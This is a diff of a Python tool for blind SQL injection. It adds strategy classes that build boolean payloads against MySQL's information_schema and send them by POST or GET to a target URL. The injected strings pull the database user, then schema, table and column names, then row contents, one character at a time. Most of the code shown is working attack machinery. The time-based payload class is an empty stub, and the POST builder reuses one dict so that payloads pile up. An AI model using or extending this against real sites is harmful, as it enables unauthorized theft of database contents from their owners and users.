@@ -1,6 +1,9 @@
 #!/usr/bin/python3
 
 from dataclasses import dataclass
+from abc import ABC, abstractmethod
+from pwn import *
+from typing import Tuple, Optional
 import requests
 import signal
 import sys
@@ -10,7 +13,6 @@ import re
 import math
 import concurrent.futures
 import copy
-from pwn import *
 
 
 # Ctrl + c
@@ -22,7 +24,7 @@ def ctrlC(sig, frame):
 signal.signal(signal.SIGINT, ctrlC)
 
 
-# Classes
+# Util Classes
 class Color:
     PURPLE = "\033[1;35;48m"
     CYAN = "\033[1;36;48m"
@@ -36,6 +38,7 @@ class Color:
     END = "\033[1;37;0m"
 
 
+# Data Classes
 @dataclass
 class WrapperRequest:
     data: str | dict
@@ -60,6 +63,179 @@ class Table:
         return ",'|',".join(self.columns)
 
 
+# Strategies Classes
+class Payload(ABC):
+
+    @abstractmethod
+    def build_payload(
+        self,
+        exploit: str,
+        position: int,
+        character: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> str:
+        """Build the payload to be used in dependency on what you want to extract from the database"""
+        pass
+
+
+class ConditionalPayload(Payload):
+
+    def build_payload(
+        self,
+        exploit: str,
+        position: int,
+        character: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> str:
+
+        result = ""
+
+        if exploit == "User":
+            result = (
+                f"' and (select ascii(substring(user(),{position},1)))='{character}"
+            )
+        elif exploit == "DBs":
+            result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
+        elif exploit == "Tables" and db is not None:
+            result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
+        elif exploit == "Columns" and db is not None and table is not None:
+            result = f"' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
+        elif exploit == "Rows" and db is not None and table is not None:
+            columns = table.concat_columns()
+            result = f"' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
+
+        return result
+
+
+class TimePayload(Payload):
+
+    def build_payload(
+        self,
+        exploit: str,
+        position: int,
+        character: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> str:
+        result = ""
+        return result
+
+
+class RequestType(ABC):
+
+    @abstractmethod
+    def build_data(
+        self,
+        data: dict,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        info_name: str,
+        position: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> list:
+        """Build the data for the request"""
+        pass
+
+    @abstractmethod
+    def send_request(
+        self,
+        main_url: str,
+        headers: dict,
+        requests_data: WrapperRequest,
+        stop_threads: bool,
+    ) -> Tuple[Optional[requests.Response], str] | None:
+        """Send the request that contain the payload"""
+        pass
+
+
+class PostRequest(RequestType):
+
+    def build_data(
+        self,
+        data: dict,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        info_name: str,
+        position: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> list:
+
+        result = []
+        characters = list(range(33, 127))
+
+        for character in characters:
+            concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
+            data[atribute_to_exploit] = concat_payload
+            result.append(WrapperRequest(data, character))
+
+        return result
+
+    def send_request(
+        self,
+        main_url: str,
+        headers: dict,
+        requests_data: WrapperRequest,
+        stop_threads: bool,
+    ) -> Tuple[Optional[requests.Response], str] | None:
+
+        if stop_threads:
+            return None
+
+        response = requests.post(main_url, headers=headers, data=requests_data.data)
+
+        return response, chr(requests_data.character)
+
+
+class GetRequest(RequestType):
+
+    def build_data(
+        self,
+        data: dict,
+        atribute_to_exploit: str,
+        payload: Payload,
+        main_url: str,
+        info_name: str,
+        position: int,
+        db: DB | None,
+        table: Table | None,
+    ) -> list:
+
+        result = []
+        characters = list(range(33, 127))
+
+        for character in characters:
+            result.append(
+                WrapperRequest(
+                    f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
+                    character,
+                )
+            )
+
+        return result
+
+    def send_request(
+        self,
+        main_url: str,
+        headers: dict,
+        requests_data: WrapperRequest,
+        stop_threads: bool,
+    ) -> Tuple[Optional[requests.Response], str] | None:
+
+        if stop_threads:
+            return None
+
+        response = requests.get(str(requests_data.data), headers)
+
+        return response, chr(requests_data.character)
+
+
+# Main Class
 class Extractor:
 
     def __init__(
@@ -519,6 +695,5 @@ def main():
     instance.build_file()
 
 
-# Main
 if __name__ == "__main__":
     main()
